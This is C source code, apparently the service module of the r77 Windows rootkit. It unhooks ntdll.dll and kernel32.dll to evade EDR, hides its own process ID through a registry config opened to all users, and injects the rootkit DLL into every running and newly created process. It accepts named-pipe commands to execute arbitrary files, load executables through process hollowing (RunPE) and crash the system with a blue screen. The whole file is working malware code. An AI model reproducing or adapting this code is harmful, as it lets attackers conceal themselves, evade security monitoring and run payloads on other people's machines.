#include "Service.h"
#include "resource.h"
#include "r77def.h"
#include "r77win.h"
#include "r77config.h"
#include "r77process.h"
#include "ProcessListener.h"
#include "ControlPipeListener.h"
#include <Psapi.h>

int main()
{
	// Unhook DLL's that are monitored by EDR.
	UnhookDll(L"ntdll.dll");
	if (BITNESS(64) || IsAtLeastWindows10())
	{
		// Unhooking kernel32.dll on Windows 7 x86 fails.
		//TODO: Find out why unhooking kernel32.dll on Windows 7 x86 fails.
		UnhookDll(L"kernel32.dll");
	}

	EnabledDebugPrivilege();

	// Get r77 DLL.
	if (!GetResource(IDR_R77, "DLL", &Dll, &DllSize)) return 0;

	// Terminate already running r77 service processes of the same bitness as the current process.
	TerminateR77Service(GetCurrentProcessId());

	// Create HKEY_LOCAL_MACHINE\SOFTWARE\$77config and set DACL to allow full access by any user.
	HKEY configKey;
	if (InstallR77Config(&configKey))
	{
		// Write current process ID to the list of hidden PID's.
		// Since this process is created using process hollowing (dllhost.exe), the name cannot begin with "$77".
		// Therefore, process hiding by PID must be used.
		HKEY pidKey;
		if (RegCreateKeyExW(configKey, L"pid", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, &pidKey, NULL) == ERROR_SUCCESS)
		{
			// The registry values "svc32" and "svc64" are reserved for the r77 service.
			DWORD processId = GetCurrentProcessId();
			RegSetValueExW(pidKey, COALESCE_BITNESS(L"svc32", L"svc64"), 0, REG_DWORD, (LPBYTE)&processId, sizeof(DWORD));
			RegCloseKey(pidKey);
		}

		RegCloseKey(configKey);
	}

	// When the NtResumeThread hook is called, the r77 service is notified through a named pipe connection.
	// This will trigger the following callback and the child process is injected.
	// After it's injected, NtResumeThread is executed in the parent process.
	// This way, r77 is injected before the first instruction is run in the child process.
	ChildProcessListener(ChildProcessCallback);

	// In addition, check for new processes every 100 ms that might have been missed by child process hooking.
	// This is particularly the case for child processes of protected processes (such as services.exe), because protected processes cannot be injected.
	// In the first iteration, the callback is invoked for every currently running process, making this the initial injection into all processes.
	NewProcessListener(100, NewProcessCallback);

	// Open a named pipe to receive commands from any process.
	// Processes should send commands to the 32-bit r77 service. Commands that require to be handled by the 64-bit r77 service are internally redirected using a second named pipe.
	ControlPipeListener(ControlCallback);

	// There are no implications when injecting a process twice.
	// If the R77_SIGNATURE is already present in the target process, the r77 DLL will just unload itself.

	// Perform startup of custom files, only in the 32-bit service to not perform startup twice.
	if (BITNESS(32))
	{
		PR77_CONFIG config = LoadR77Config();

		for (DWORD i = 0; i < config->StartupFiles->Count; i++)
		{
			ShellExecuteW(NULL, L"open", config->StartupFiles->Values[i], NULL, NULL, SW_SHOW);
		}

		DeleteR77Config(config);
	}

	while (TRUE)
	{
		Sleep(100);
	}

	return 0;
}
VOID ChildProcessCallback(DWORD processId)
{
	// Hook the newly created child processes before it is actually started.
	// After this function returns, the original NtResumeThread is called.

	if (!IsInjectionPaused)
	{
		InjectDll(processId, Dll, DllSize, FALSE);
	}
}
VOID NewProcessCallback(DWORD processId)
{
	// Hook new processes that might have been missed by child process hooking.
	if (!IsInjectionPaused)
	{
		InjectDll(processId, Dll, DllSize, TRUE);
	}
}
VOID ControlCallback(DWORD controlCode, HANDLE pipe)
{
	// The r77 service received a command from another process.
	// If the current instance of the r77 service is 32-bit, but the command must be handled by the
	// 64-bit r77 service, the command is redirected automatically.

	switch (controlCode)
	{
		case CONTROL_R77_TERMINATE_SERVICE:
		{
			if (BITNESS(32))
			{
				RedirectCommand64(controlCode, NULL, 0);
			}

			ExitProcess(0);
			break;
		}
		case CONTROL_R77_UNINSTALL:
		{
			if (BITNESS(32))
			{
				RedirectCommand64(controlCode, NULL, 0);
			}

			HKEY key;
			if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_ALL_ACCESS | COALESCE_BITNESS(KEY_WOW64_32KEY, KEY_WOW64_64KEY), &key) == ERROR_SUCCESS)
			{
				RegDeleteValueW(key, HIDE_PREFIX L"stager");
			}

			DeleteScheduledTask(COALESCE_BITNESS(R77_SERVICE_NAME32, R77_SERVICE_NAME64));
			DetachAllInjectedProcesses();
			UninstallR77Config();
			TerminateR77Service(-1);
			break;
		}
		case CONTROL_R77_PAUSE_INJECTION:
		{
			if (BITNESS(32))
			{
				RedirectCommand64(controlCode, NULL, 0);
			}

			IsInjectionPaused = TRUE;
			break;
		}
		case CONTROL_R77_RESUME_INJECTION:
		{
			if (BITNESS(32))
			{
				RedirectCommand64(controlCode, NULL, 0);
			}

			IsInjectionPaused = FALSE;
			break;
		}
		case CONTROL_PROCESSES_INJECT:
		{
			DWORD processId;
			DWORD bytesRead;
			if (ReadFile(pipe, &processId, sizeof(DWORD), &bytesRead, NULL) && bytesRead == sizeof(DWORD))
			{
				// The 32-bit r77 service injects 32-bit processes
				// The 64-bit r77 service injects 64-bit processes
				BOOL is64Bit;
				if (Is64BitProcess(processId, &is64Bit))
				{
					if (BITNESS(is64Bit ? 64 : 32))
					{
						InjectDll(processId, Dll, DllSize, TRUE);
					}
					else
					{
						RedirectCommand64(controlCode, &processId, sizeof(DWORD));
					}
				}
			}

			break;
		}
		case CONTROL_PROCESSES_INJECT_ALL:
		{
			if (BITNESS(32))
			{
				RedirectCommand64(controlCode, NULL, 0);
			}

			LPDWORD processes = NEW_ARRAY(DWORD, 10000);
			DWORD processCount = 0;
			if (EnumProcesses(processes, sizeof(DWORD) * 10000, &processCount))
			{
				processCount /= sizeof(DWORD);

				for (DWORD i = 0; i < processCount; i++)
				{
					InjectDll(processes[i], Dll, DllSize, TRUE);
				}
			}
			break;
		}
		case CONTROL_PROCESSES_DETACH:
		{
			DWORD processId;
			DWORD bytesRead;
			if (ReadFile(pipe, &processId, sizeof(DWORD), &bytesRead, NULL) && bytesRead == sizeof(DWORD))
			{
				// The 32-bit r77 service detaches 32-bit processes
				// The 64-bit r77 service detaches 64-bit processes
				BOOL is64Bit;
				if (Is64BitProcess(processId, &is64Bit))
				{
					if (BITNESS(is64Bit ? 64 : 32))
					{
						DetachInjectedProcessById(processId);
					}
					else
					{
						RedirectCommand64(controlCode, &processId, sizeof(DWORD));
					}
				}
			}

			break;
		}
		case CONTROL_PROCESSES_DETACH_ALL:
		{
			if (BITNESS(32))
			{
				RedirectCommand64(controlCode, NULL, 0);
			}

			DetachAllInjectedProcesses();
			break;
		}
		case CONTROL_USER_SHELLEXEC:
		{
			WCHAR file[MAX_PATH + 1];
			WCHAR commandLine[MAX_PATH + 1];

			if (ReadFileStringW(pipe, file, MAX_PATH + 1) &&
				ReadFileStringW(pipe, commandLine, MAX_PATH + 1))
			{
				ShellExecuteW(NULL, L"open", file, commandLine, NULL, SW_SHOW);
			}
			break;
		}
		case CONTROL_USER_RUNPE:
		{
			WCHAR path[MAX_PATH + 1];
			if (ReadFileStringW(pipe, path, MAX_PATH + 1))
			{
				DWORD fileSize;
				DWORD bytesRead;
				if (ReadFile(pipe, &fileSize, sizeof(DWORD), &bytesRead, NULL) && bytesRead == sizeof(DWORD))
				{
					LPBYTE file = NEW_ARRAY(BYTE, fileSize);
					if (ReadFile(pipe, file, fileSize, &bytesRead, NULL) && bytesRead == fileSize)
					{
						BOOL is64Bit;
						if (IsExecutable64Bit(file, &is64Bit))
						{
							if (BITNESS(is64Bit ? 64 : 32))
							{
								RunPE(path, file);
							}
							else
							{
								// RunPE executable does not match bitness of r77 service, needs to be redirected.

								int pathSize = (lstrlenW(path) + 1) * sizeof(WCHAR);

								DWORD redirectedDataSize =
									pathSize +				// path
									sizeof(DWORD) +			// file size
									fileSize;				// file
								LPBYTE redirectedData = NEW_ARRAY(BYTE, redirectedDataSize);

								DWORD offset = 0;
								i_memcpy(redirectedData + offset, path, pathSize);
								offset += pathSize;
								i_memcpy(redirectedData + offset, &fileSize, sizeof(DWORD));
								offset += sizeof(DWORD);
								i_memcpy(redirectedData + offset, file, fileSize);

								RedirectCommand64(controlCode, redirectedData, redirectedDataSize);
								FREE(redirectedData);
							}
						}
					}
					FREE(file);
				}
			}

			break;
		}
		case CONTROL_SYSTEM_BSOD:
		{
			BOOLEAN previousValue = FALSE;
			R77_RtlAdjustPrivilege(20, TRUE, FALSE, &previousValue);

			BOOLEAN oldIsCritical = FALSE;
			R77_RtlSetProcessIsCritical(TRUE, &oldIsCritical, FALSE);

			ExitProcess(0);
			break;
		}
	}
}
VOID RedirectCommand64(DWORD controlCode, LPVOID data, DWORD size)
{
	// The 32-bit r77 service receives commands initially.
	// If it should be executed by the 64-bit r77 service, redirect it.

	if (Is64BitOperatingSystem())
	{
		HANDLE pipe64 = CreateFileW(CONTROL_PIPE_REDIRECT64_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (pipe64 != INVALID_HANDLE_VALUE)
		{
			DWORD bytesWritten;
			WriteFile(pipe64, &controlCode, sizeof(DWORD), &bytesWritten, NULL);
			if (data && size) WriteFile(pipe64, data, size, &bytesWritten, NULL);
			CloseHandle(pipe64);
		}
	}
}